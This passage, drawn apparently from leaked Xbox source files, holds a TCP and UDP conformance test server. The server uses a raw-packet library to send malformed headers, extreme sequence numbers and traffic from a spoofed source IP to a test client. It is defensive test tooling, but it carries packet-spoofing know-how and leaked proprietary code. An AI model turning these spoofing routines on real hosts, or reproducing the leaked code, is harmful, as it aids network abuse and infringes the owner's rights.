	TCPUrgentAfterEndServ,												// TCPMSG_URGENT_AFTEREND,
	TCPUrgentAtEndServ,													// TCPMSG_URGENT_ATEND,
	TCPUrgentBeforeEndServ,												// TCPMSG_URGENT_BEFOREEND,
	TCPUrgentMaxServ,													// TCPMSG_URGENT_MAX,
	TCPUrgentNoFlagServ,												// TCPMSG_URGENT_NOFLAG,
	TCPOptCutoffServ,													// TCPMSG_OPT_CUTOFF,
	TCPOptAtEndServ,													// TCPMSG_OPT_ATEND,
	TCPOptBeforeEndServ,												// TCPMSG_OPT_BEFOREEND,
	TCPOptNoOptsServ,													// TCPMSG_OPT_NOOPTIONS,
	TCPOptMaxOptsServ,													// TCPMSG_OPT_MAXOPTIONS,
	TCPOptMaxOptLenServ,												// TCPMSG_OPT_MAXOPTLEN,
	TCPOptEndOfOptsServ,												// TCPMSG_OPT_ENDOPTFIRST,
	TCPOptMssZeroServ,													// TCPMSG_OPT_MSSZERO,
	TCPOptMssOneServ,													// TCPMSG_OPT_MSSONE,
	TCPOptMssMaxServ,													// TCPMSG_OPT_MSSMAX,
	TCPConnSynAndNoAckServ,												// TCPMSG_CONN_SYNANDNOACK,
	TCPConnExtraSynServ,												// TCPMSG_CONN_EXTRASYN,
	TCPConnAckWrongSynServ,												// TCPMSG_CONN_ACKWRONGSYN,
	TCPConnSynAckWrongSynServ,											// TCPMSG_CONN_SYNACKWRONGSYN,
	TCPConnAckNoConnServ,												// TCPMSG_CONN_ACKNOCONN,
	TCPConnSynAckListenerServ,											// TCPMSG_CONN_SYNACKLISTENER,
	TCPShutFinAndNoAckServ,												// TCPMSG_SHUT_FINANDNOACK
#endif
};

extern "C" void PrintDebug(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}

extern "C" void LogDebugMessage(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}

//==================================================================================
// DllMain
//----------------------------------------------------------------------------------
//
// Description: Global entry point
//
// Arguments:
//	HINSTANCE	hInstance	Handle to calling instance
//	DWORD		dwReason	Reason for calling entry point
//	LPVOID		lpContext	
//
// Returns:
//	TRUE on successful attach or detach, FALSE otherwise
//==================================================================================
BOOL WINAPI DllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext)
{
    switch (dwReason) {

    case DLL_PROCESS_ATTACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}


//==================================================================================
// TcpServerCallbackFunction
//----------------------------------------------------------------------------------
//
// Description: Function exported for Netsync callbacks
//
// Arguments:
//  HANDLE      hSessionObject  Handle to session instance
//	HANDLE		hNetsyncObject	Handle to calling instance
//	DWORD		FromAddr		Address of sender of message that caused the callback
//	CHAR		*ReceiveMessage	Buffer containing the packet that caused the callback
//	LPVOID		lpContext		Context indicating which session this belongs to
//
// Returns:
//	Returns TRUE if the message was received was successfully handled, FALSE otherwise
//==================================================================================
BOOL TcpServerCallbackFunction(HANDLE hSessionObject, HANDLE hNetsyncObject, DWORD FromAddr, DWORD dwMessageType, DWORD dwMessageSize, CHAR *ReceiveMessage, LPVOID lpContext)
{
	PSESSION_INFO pSessionInfo = (PSESSION_INFO) lpContext;
	PTCP_TESTREQ pTestRequest = (PTCP_TESTREQ) ReceiveMessage;
	BOOL fSuccess = TRUE;

	switch(pTestRequest->dwMessageId)
	{
	case TCPMSG_TESTREQ:
		// Client is requesting a test.
		// If we support that test, ACK it and run the server side of the case
		if(pTestRequest->TestId < TCPMSG_MAXTEST)
		{
			pSessionInfo->pCurrentRequest = pTestRequest;

			// Either wrap around at 254 or increment the current host
			(g_bLocalSpoofIpNextHost == 254) ? g_bLocalSpoofIpNextHost = LOCAL_SPOOF_IP_BASE_HOST : ++g_bLocalSpoofIpNextHost;

			Sleep(2000);

			// Run the test
			if(!g_ServerFunctions[pTestRequest->TestId](FromAddr, pSessionInfo))
			{
				_tprintf(TEXT("Error running server-side of test %u\n"), pTestRequest->TestId);
				break;
			}

			pSessionInfo->pCurrentRequest = NULL;
		}
		break;
	case TCPMSG_TESTDONE:
		// Client is signalling that this test is done
		// May want to add and ack later if this isn't reliable enough
		fSuccess = FALSE;
		break;
	default:
		// Unknown message received
		break;
	}

	return fSuccess;
}


//==================================================================================
// TcpServerStartFunction
//----------------------------------------------------------------------------------
//
// Description: Funtion called once for each session that is created
//
// Arguments:
//  HANDLE      hSessionObject  Handle to session instance
//	HANDLE		hNetsyncObject	Handle to calling instance
//	BYTE		byClientCount	Number of clients this test is being started with
//	DWORD		*ClientAddrs	List of client addresses (number of addresses indicated by byClientCount)
//	WORD		LowPort			The lowest port to use for this test
//	WORD		HighPort		The higest port to use for this test
//
// Returns:
//	Returns a pointer to the session information that is being stored for this session
//==================================================================================
LPVOID TcpServerStartFunction(HANDLE hSessionObject, HANDLE hNetsyncObject, BYTE byClientCount, DWORD *ClientAddrs, WORD LowPort, WORD HighPort)
{
	PSESSION_INFO pCurrentSession = NULL;
	IN_ADDR INAddr;
	TCHAR *szLocalMacAddress = NULL;
	CHAR szClientIPAddr[16];

	pCurrentSession = (PSESSION_INFO) LocalAlloc(LPTR, sizeof(SESSION_INFO));
	_tprintf(TEXT("Starting session: 0x%08x\n"), pCurrentSession);

	// Fill the session info structure
	pCurrentSession->hNetsyncObject = hNetsyncObject;
	pCurrentSession->byClientCount = byClientCount;
	pCurrentSession->ClientAddrs = ClientAddrs;
	pCurrentSession->LowPort = LowPort;
	pCurrentSession->HighPort = HighPort;


	// Calculate the spoofed server address string
	sprintf(pCurrentSession->szServerIPAddr, "%s%u", LOCAL_SPOOF_IP_BASE_STRING, g_bLocalSpoofIpNextHost);
	++g_bLocalSpoofIpNextHost;

//	INAddr.S_un.S_addr = GetMyAddr();
//	strcpy(pCurrentSession->szServerIPAddr, inet_ntoa(INAddr));

	// Calculate the server address string
	INAddr.S_un.S_addr = ClientAddrs[0];
	strcpy(pCurrentSession->szClientIPAddr, inet_ntoa(INAddr));

	// Initialize the SPARTA variables for this session
	try
    {
		BYTE bProtocol = 0x06;

		pCurrentSession->pInterfaceList = new CInterfaceList;
		pCurrentSession->pInterface = new CInterface(pCurrentSession->pInterfaceList->GetNameAt(0));

		szLocalMacAddress = (pCurrentSession->pInterface->GetMediaAddress())->GetString();

		pCurrentSession->pAutoArp = new CAutoArp(szLocalMacAddress, pCurrentSession->szServerIPAddr);

		MAC_MEDIA_TYPE MediaType = pCurrentSession->pInterface->GetMediaType();

		// Create the receive patterns to filter for during the TCP tests
		pCurrentSession->pInterface->EnableDirectedReceiveMode();
		pCurrentSession->pInterface->EnableBroadcastReceiveMode();
		pCurrentSession->pProtocolPattern = CMacHeader::CreateProtocolTypePattern(MediaType, 0x800);
		pCurrentSession->pDestAddrPattern = CMacHeader::CreateDestAddressPattern(MediaType, pCurrentSession->pInterface->GetMediaAddress());
		pCurrentSession->pSrcIpPattern = CIPHeader::CreateSrcIPAddressPattern(MediaType, pCurrentSession->szClientIPAddr);
		pCurrentSession->pDestIpPattern = CIPHeader::CreateDestIPAddressPattern(MediaType, pCurrentSession->szServerIPAddr);
		pCurrentSession->pProtocolIpPattern = new CPattern(23, 1, &bProtocol);

		// Add the pattern filters
		pCurrentSession->pInterface->AddPatternFilter(pCurrentSession->pProtocolPattern);
		pCurrentSession->pInterface->AddPatternFilter(pCurrentSession->pDestAddrPattern);
		pCurrentSession->pInterface->AddPatternFilter(pCurrentSession->pSrcIpPattern);
		pCurrentSession->pInterface->AddPatternFilter(pCurrentSession->pDestIpPattern);
		pCurrentSession->pInterface->AddPatternFilter(pCurrentSession->pProtocolIpPattern);

		pCurrentSession->pInterface->EnablePatternFiltering();
		pCurrentSession->pInterface->StartListening();
	}
    catch(CSpartaException *Ex)
    {
        _tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
        delete Ex;
    }

	// If anything needs to be setup for all the tests or if the currently
	// connected clients need to be tracked, it will be done here
	return (LPVOID) pCurrentSession;
}

//==================================================================================
// TcpServerStopFunction
//----------------------------------------------------------------------------------
//
// Description: Function called once when each session is closed
//
// Arguments:
//  HANDLE      hSessionObject  Handle to session instance
//	HANDLE		hNetsyncObject	Handle to calling instance
//	LPVOID		lpContext		Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
VOID TcpServerStopFunction(HANDLE hSessionObject, HANDLE hNetsyncObject, LPVOID lpContext)
{
	PSESSION_INFO pCurrentSession = (PSESSION_INFO) lpContext;

	_tprintf(TEXT("Stopping session: 0x%08x\n"), pCurrentSession);

	// Stop auto arping
	pCurrentSession->pAutoArp ? delete pCurrentSession->pAutoArp : 0;

	// Stop listening to the interface
    pCurrentSession->pInterface->StopListening();

	// Release the SPARTA pattern variables
	pCurrentSession->pProtocolPattern ? delete pCurrentSession->pProtocolPattern : 0;
    pCurrentSession->pDestAddrPattern ? delete pCurrentSession->pDestAddrPattern : 0;
    pCurrentSession->pSrcIpPattern ? delete pCurrentSession->pSrcIpPattern : 0;
    pCurrentSession->pDestIpPattern ? delete pCurrentSession->pDestIpPattern : 0;
    pCurrentSession->pProtocolIpPattern ? delete pCurrentSession->pProtocolIpPattern : 0;

	// Stop doing pattern filtering
    pCurrentSession->pInterface->DisablePatternFiltering();
	pCurrentSession->pInterface->StopListening();

	// Uninitialize the SPARTA variables for this session
	pCurrentSession->pInterfaceList ? delete pCurrentSession->pInterfaceList : 0;
	pCurrentSession->pInterface ? delete pCurrentSession->pInterface : 0;
	pCurrentSession->pCurrentRequest = NULL;

	LocalFree(pCurrentSession);

	// If anything needs to be cleaned up, it will be done here.
	return;
}


//==================================================================================
// Test functions
//==================================================================================

//==================================================================================
// ReceiveTCPPacket
//----------------------------------------------------------------------------------
//
// Description: Function that receives a TCP packet
//
// Arguments:
//	PSESSION_INFO	pSessionInfo	Pointer to information on this test session
//	BYTE			bFlagValue		Indicates the flags that must be present
//	INT				*pnAckNum		Ack number to be used in next packet sent out
//	INT				*pnSeqNum		Seq number to be used in next packet sent out
//
// Returns:
//	Pointer to a TCP packet if successful, NULL otherwise
//==================================================================================
CTCPPacket* ReceiveTCPPacket(PSESSION_INFO pSessionInfo, BYTE bFlagValue, INT *pnAckNum, INT *pnSeqNum)
{
    CTCPPacket *pNewPacket;

    try
    {
		// Set the timer for receiving a packet to 5 seconds
        CReceiveTimer Timer;
        Timer.Start(3000); 
		
		// Receive next TCP packet
		pNewPacket = (CTCPPacket*) pSessionInfo->pInterface->Receive(Timer);
		if (!pNewPacket)
			goto Exit;

		if ((pNewPacket->TCPHeader.GetFlag() & bFlagValue) == bFlagValue)
		{
			USHORT usLength;
			usLength = pNewPacket->IPHeader.GetDatagramLength() -                    
				pNewPacket->IPHeader.GetHdrLength() * 4 -
				pNewPacket->TCPHeader.GetHdrLength() * 4;

			*pnAckNum = pNewPacket->TCPHeader.GetSeqNumber() + usLength;
			*pnSeqNum = pNewPacket->TCPHeader.GetAckNumber();
			goto Exit;
		}

		// Packet didn't meet the flag requirements so release it
		delete pNewPacket;
		pNewPacket = NULL;
    }
    catch(CSpartaException *Ex)
    {
        DEBUGPRINT(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
		delete pNewPacket;
		pNewPacket = NULL;
        delete Ex;
    }

Exit:

    return pNewPacket;
}

//==================================================================================
// SendTCPPacket
//----------------------------------------------------------------------------------
//
// Description: Function that sends a TCP packet
//
// Arguments:
//	PSESSION_INFO	pSessionInfo	Pointer to information on this test session
//	DWORD			FromAddr		IP address of client that requested test
//	INT				nSeqNum			Seq num to be used for this packet
//	INT				nAckNum			Ack num to be used for this packet
//	WORD			HeaderLength	Header length of outgoing TCP packet
//	BYTE			bFlag			Flags to be used for this packet
//	BOOL			fCalcHdrLen		Determines whether header length should be determined automatically
//
// Returns:
//	TRUE if successful, FALSE otherwise
//==================================================================================
BOOL SendTCPPacket(PSESSION_INFO pSessionInfo, DWORD FromAddr, INT nSeqNum, INT nAckNum, WORD HeaderLength, BYTE bFlag, BOOL fCalcHdrLen)
{
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BOOL fSuccess = TRUE;

	// Format the client Mac address string
	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Format the client IP address string
	ClientAddr.S_un.S_addr = FromAddr;
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	// Watch for SPARTA exceptions
	try
    {
		// Create a TCP packet
		MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
        CTCPPacket TCPPacket(MediaType);
    
		// Create Mac addresses for the source and destination
        CMacAddress ClientMacAddr(MediaType, szClientMacAddr); 
    
        TCPPacket.MacHeader.SetDestAddress(ClientMacAddr);
        TCPPacket.MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
        TCPPacket.MacHeader.SetProtocolType(PROTOCOL_TYPE_IP4);
    
        TCPPacket.IPHeader.SetVersion(4);
        TCPPacket.IPHeader.SetTOS(0);
        TCPPacket.IPHeader.SetID(1);
        TCPPacket.IPHeader.SetTTL(1);
        TCPPacket.IPHeader.SetFragOffset(0);
        TCPPacket.IPHeader.SetFlag(0);
        TCPPacket.IPHeader.SetProtocolType(PROTOCOL_TYPE_TCP);
        TCPPacket.IPHeader.SetDestAddr(szClientIPAddr);
        TCPPacket.IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
    
        TCPPacket.TCPHeader.SetSrcPort(pSessionInfo->LowPort);
        TCPPacket.TCPHeader.SetDestPort(pSessionInfo->LowPort);
        TCPPacket.TCPHeader.SetSeqNumber(nSeqNum);
        TCPPacket.TCPHeader.SetAckNumber(nAckNum);
        TCPPacket.TCPHeader.SetFlag(bFlag);
		TCPPacket.TCPHeader.SetWindowSize(16384);

		if(!fCalcHdrLen)
		{
			TCPPacket.TCPHeader.SetAutoCalcLength(OFF);
			TCPPacket.TCPHeader.SetHdrLength(HeaderLength);

			// If SYN flag is set, set the RemoteMSS option
			if (bFlag & TCP_SYN)
				TCPPacket.TCPHeader.Options[0].AddMSS(MSS_DEFAULT);

		}
		else
		{
			// If SYN flag is set, set the RemoteMSS option
			if (bFlag & TCP_SYN)
				TCPPacket.TCPHeader.Options[0].AddMSS(MSS_DEFAULT);
		}

        pSessionInfo->pInterface->Send(TCPPacket);
    }
    catch(CSpartaException *Ex)
    {
        DEBUGPRINT(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
		fSuccess = FALSE;
        delete Ex;
    }

    return fSuccess;
}

//==================================================================================
// EstablishTCPConnection
//----------------------------------------------------------------------------------
//
// Description: Function that uses SPARTA APIs to establish a TCP connection with
// a remote machine
//
// Arguments:
//	PSESSION_INFO	pSessionInfo	Pointer to information on this test session
//	DWORD			FromAddr		IP address of client that requested test
//	INT				*pnAckNum		Ack number to be used in next packet sent out
//	INT				*pnSeqNum		Seq number to be used in next packet sent out
//	WORD			HeaderLength	Header length to use for initial SYN, if 0, then automatically generate
//
// Returns:
//	TRUE on successful connection, FALSE otherwise
//==================================================================================
BOOL EstablishTCPConnection(PSESSION_INFO pSessionInfo, DWORD FromAddr, INT *pnAckNum, INT *pnSeqNum, WORD HeaderLength)
{
	INT nInitialAckNum = *pnAckNum, nInitialSeqNum = *pnSeqNum;
    BOOL fPassed = TRUE;
    CTCPPacket* pPacket = NULL;

    // Send a syn-ack
    if (!SendTCPPacket(pSessionInfo, FromAddr, *pnSeqNum, *pnAckNum, HeaderLength, TCP_SYN, (HeaderLength == 0)))
	{
        _tprintf(TEXT("Couldn't send SYN to start connection\n"));
		fPassed = FALSE;
        goto Exit;
    }

    // Grab the syn packet
    if (!(pPacket = ReceiveTCPPacket(pSessionInfo, TCP_SYN | TCP_ACK, pnAckNum, pnSeqNum)))
	{
        _tprintf(TEXT("Didn't receive SYN-ACK in response to SYN\n"));
        fPassed = FALSE;
		goto Exit;
    }

	if(*pnSeqNum != nInitialSeqNum + 1)
	{
        _tprintf(TEXT("Received SYN-ACK's ack number: %u, expected %u\n"), (DWORD) *pnSeqNum, nInitialSeqNum + 1);
        fPassed = FALSE;
		goto Exit;
	}

	// Delete packet after processing
    delete pPacket;
	pPacket = NULL;

    // Send a syn-ack
    if (!SendTCPPacket(pSessionInfo, FromAddr, *pnSeqNum, ++(*pnAckNum), 0, TCP_ACK, TRUE))
	{
        _tprintf("Couldn't send ACK to finish connection establishment\n");
		fPassed = FALSE;
        return 1;
    }    

Exit:

    pPacket ? delete pPacket : 0;

    return fPassed;
}

//==================================================================================
// TCPSeqNumMaxServ
//----------------------------------------------------------------------------------
//
// Description: Server sends a TCP SYN with the maximum sequence number.  Then
// ack's the SYN-ACK received from the client side of the test.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPSeqNumMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	INT nAckNum = 0, nSeqNum = -1;

	return EstablishTCPConnection(pSessionInfo, FromAddr, &nAckNum, &nSeqNum, 0);
}

//==================================================================================
// TCPSeqNumMinServ
//----------------------------------------------------------------------------------
//
// Description: Server sends a TCP SYN with the minimum sequence number.  Then
// ack's the SYN-ACK received from the client side of the test.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPSeqNumMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	INT nAckNum = 0, nSeqNum = 0;

	return EstablishTCPConnection(pSessionInfo, FromAddr, &nAckNum, &nSeqNum, 0);
}

//==================================================================================
// TCPDataOffBelowMinServ
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with a data offset that is lower than the
// minimum header length of a TCP packet
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPDataOffBelowMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPPacket(pSessionInfo, FromAddr, nSeqNum, nAckNum, 16, TCP_SYN, FALSE);
}

//==================================================================================
// TCPDataOffAboveAvailServ
//----------------------------------------------------------------------------------
//
// Description: Sends a TCP SYN packet with a data offset that is the maximum value
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL TCPDataOffAboveAvailServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	INT nAckNum = 0, nSeqNum = 0;

	return SendTCPPacket(pSessionInfo, FromAddr, nSeqNum, nAckNum, 60, TCP_SYN, FALSE);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\udp\inc\udpmsg.h ===
#ifndef __UDPMSG_H__
#define __UDPMSG_H__

//***************
//*** Defines ***
//***************

#define UDPMSG_TESTREQ		NETSYNC_MSG_USER + 1
#define UDPMSG_TESTACK		NETSYNC_MSG_USER + 2
#define UDPMSG_TESTDONE		NETSYNC_MSG_USER + 3

#define PROTOCOL_UDP		17

#define UDPHEADER_SIZE		8
#define	IPHEADER_SIZE		20

//****************
//*** Typedefs ***
//****************

// UDP test case IDs
typedef enum _UDPMSG_TESTTYPES
{
	// Tests for source port field
	UDPMSG_SOURCEPORT_MAX,
	UDPMSG_SOURCEPORT_MIN,
	UDPMSG_SOURCEPORT_ZERO,

	// Tests for dest port field
	UDPMSG_DESTPORT_MAX,
	UDPMSG_DESTPORT_MIN,
	UDPMSG_DESTPORT_ZERO,

	// Tests for length field
	UDPMSG_LENGTH_BELOWMIN,
	UDPMSG_LENGTH_ATMIN,
	UDPMSG_LENGTH_ABOVEMIN,
	UDPMSG_LENGTH_ABOVETOTAL,
	UDPMSG_LENGTH_BELOWTOTAL,
	UDPMSG_LENGTH_MAXIMUM,

	// Tests for checksum field
	UDPMSG_CHECKSUM_ZEROS,

	UDPMSG_MAXTEST
} UDPMSG_TESTTYPES, *PUDPMSG_TESTTYPES;

// UDP test request packet
typedef struct _UDP_TESTREQ {
    DWORD				dwMessageId;	// Specifies the message id
	UDPMSG_TESTTYPES	TestId;			// Specifies the test requested
	CHAR				MacAddr[16];	// Specifies the MAC address of the client (make size a multiple of 4)
} UDP_TESTREQ, *PUDP_TESTREQ;

// UDP test request ack
typedef struct _UDP_TESTACK {
    DWORD				dwMessageId;	// Specifies the message id
	UDPMSG_TESTTYPES	TestId;			// Specifies the test requested
} UDP_TESTACK, *PUDP_TESTACK;

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\udp\server\udpserv.h ===
#ifndef __UDPSERV_H__
#define __UDPSERV_H__

//==================================================================================
// Includes
//==================================================================================

#include <netsync.h>
#include "udpmsg.h"
#include "spartaapi.h"

//==================================================================================
// Typedefs
//==================================================================================

// Session info structure
typedef struct _SESSION_INFO
{
	CInterfaceList *pInterfaceList;
	CInterface *pInterface;
	HANDLE hNetsyncObject;
	BYTE byClientCount;
	DWORD *ClientAddrs;
	WORD LowPort;
	WORD HighPort;
	CHAR szServerIPAddr[16];
	PUDP_TESTREQ pCurrentRequest;
} SESSION_INFO, *PSESSION_INFO;

// UDP test function type
typedef BOOL (*PUDP_SERV_FUNCTION) (DWORD FromAddr, PSESSION_INFO pSessionInfo);

//==================================================================================
// Prototypes 
//==================================================================================

// Test case functions
BOOL UDPSourceMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPSourceMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPSourceZeroServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPDestMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPDestMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPDestZeroServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPLenBelowMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPLenAtMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPLenAboveMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPLenAboveTotalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPLenBelowTotalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPLenMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPCheckOnesServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL UDPCheckZerosServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\udp\server\udpserv.cpp ===
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include "udpserv.h"
#include "myaddr.h"


PUDP_SERV_FUNCTION	g_ServerFunctions[UDPMSG_MAXTEST] = 
{
	UDPSourceMaxServ,			// UDPMSG_SOURCEPORT_MAX
	UDPSourceMinServ,			// UDPMSG_SOURCEPORT_MIN
	UDPSourceZeroServ,			// UDPMSG_SOURCEPORT_ZERO
	UDPDestMaxServ,				// UDPMSG_DESTPORT_MAX
	UDPDestMinServ,				// UDPMSG_DESTPORT_MIN
	UDPDestZeroServ,			// UDPMSG_DESTPORT_ZERO
	UDPLenBelowMinServ,			// UDPMSG_LENGTH_BELOWMIN
	UDPLenAtMinServ,			// UDPMSG_LENGTH_ATMIN
	UDPLenAboveMinServ,			// UDPMSG_LENGTH_ABOVEMIN
	UDPLenAboveTotalServ,		// UDPMSG_LENGTH_ABOVETOTAL
	UDPLenBelowTotalServ,		// UDPMSG_LENGTH_BELOWTOTAL
	UDPLenMaxServ,				// UDPMSG_LENGTH_MAXIMUM
	UDPCheckZerosServ			// UDPMSG_CHECKSUM_ZEROSOK
};

extern "C" void PrintDebug(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}

extern "C" void LogDebugMessage(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}

//==================================================================================
// DllMain
//----------------------------------------------------------------------------------
//
// Description: Global entry point
//
// Arguments:
//	HINSTANCE	hInstance	Handle to calling instance
//	DWORD		dwReason	Reason for calling entry point
//	LPVOID		lpContext	
//
// Returns:
//	TRUE on successful attach or detach, FALSE otherwise
//==================================================================================
BOOL WINAPI DllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext)
{
    switch (dwReason) {

    case DLL_PROCESS_ATTACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}


//==================================================================================
// UdpServerCallbackFunction
//----------------------------------------------------------------------------------
//
// Description: Function exported for Netsync callbacks
//
// Arguments:
//  HANDLE      hSessionObject  Handle to session instance
//	HANDLE		hNetsyncObject	Handle to calling instance
//	DWORD		FromAddr		Address of sender of message that caused the callback
//	CHAR		*ReceiveMessage	Buffer containing the packet that caused the callback
//	LPVOID		lpContext		Context indicating which session this belongs to
//
// Returns:
//	Returns TRUE if the message was received was successfully handled, FALSE otherwise
//==================================================================================
BOOL UdpServerCallbackFunction(HANDLE hSessionObject, HANDLE hNetsyncObject, DWORD FromAddr, DWORD dwMessageType, DWORD dwMessageSize, CHAR *ReceiveMessage, LPVOID lpContext)
{
	PSESSION_INFO pSessionInfo = (PSESSION_INFO) lpContext;
	PUDP_TESTREQ pTestRequest = (PUDP_TESTREQ) ReceiveMessage;
	BOOL fSuccess = TRUE;

	switch(pTestRequest->dwMessageId)
	{
	case UDPMSG_TESTREQ:
		// Client is requesting a test.
		// If we support that test, ACK it and run the server side of the case
		if(pTestRequest->TestId < UDPMSG_MAXTEST)
		{
			pSessionInfo->pCurrentRequest = pTestRequest;

			Sleep(2000);

			// Run the test
			if(!g_ServerFunctions[pTestRequest->TestId](FromAddr, pSessionInfo))
			{
				_tprintf(TEXT("Error running server-side of test %u\n"), pTestRequest->TestId);
				break;
			}

			pSessionInfo->pCurrentRequest = NULL;
		}
		break;
	case UDPMSG_TESTDONE:
		// Client is signalling that this test is done
		// May want to add and ack later if this isn't reliable enough
		fSuccess = FALSE;
		break;
	default:
		// Unknown message received
		break;
	}

	return fSuccess;
}


//==================================================================================
// UdpServerStartFunction
//----------------------------------------------------------------------------------
//
// Description: Funtion called once for each session that is created
//
// Arguments:
//  HANDLE      hSessionObject  Handle to session instance
//	HANDLE		hNetsyncObject	Handle to calling instance
//	BYTE		byClientCount	Number of clients this test is being started with
//	DWORD		*ClientAddrs	List of client addresses (number of addresses indicated by byClientCount)
//	WORD		LowPort			The lowest port to use for this test
//	WORD		HighPort		The higest port to use for this test
//
// Returns:
//	Returns a pointer to the session information that is being stored for this session
//==================================================================================
LPVOID UdpServerStartFunction(HANDLE hSessionObject, HANDLE hNetsyncObject, BYTE byClientCount, DWORD *ClientAddrs, WORD LowPort, WORD HighPort)
{
	PSESSION_INFO pCurrentSession = NULL;
	IN_ADDR ServerAddr;
	CHAR szServerAddr[16];

	pCurrentSession = (PSESSION_INFO) LocalAlloc(LPTR, sizeof(SESSION_INFO));
	_tprintf(TEXT("Starting session: 0x%08x\n"), pCurrentSession);

	// Fill the session info structure
	pCurrentSession->hNetsyncObject = hNetsyncObject;
	pCurrentSession->byClientCount = byClientCount;
	pCurrentSession->ClientAddrs = ClientAddrs;
	pCurrentSession->LowPort = LowPort;
	pCurrentSession->HighPort = HighPort;
	pCurrentSession->pCurrentRequest = NULL;

	// Calculate the server address string
	ServerAddr.S_un.S_addr = GetMyAddr();
	strcpy(pCurrentSession->szServerIPAddr, inet_ntoa(ServerAddr));

	// Initialize the SPARTA variables for this session
	try
    {
		pCurrentSession->pInterfaceList = new CInterfaceList;
		pCurrentSession->pInterface = new CInterface(pCurrentSession->pInterfaceList->GetNameAt(0));
	}
    catch(CSpartaException *Ex)
    {
        _tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
        delete Ex;
    }

	// If anything needs to be setup for all the tests or if the currently
	// connected clients need to be tracked, it will be done here
	return (LPVOID) pCurrentSession;
}

//==================================================================================
// UdpServerStopFunction
//----------------------------------------------------------------------------------
//
// Description: Function called once when each session is closed
//
// Arguments:
//  HANDLE      hSessionObject  Handle to session instance
//	HANDLE		hNetsyncObject	Handle to calling instance
//	LPVOID		lpContext		Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
VOID UdpServerStopFunction(HANDLE hSessionObject, HANDLE hNetsyncObject, LPVOID lpContext)
{
	PSESSION_INFO pCurrentSession = (PSESSION_INFO) lpContext;

	_tprintf(TEXT("Stopping session: 0x%08x\n"), pCurrentSession);

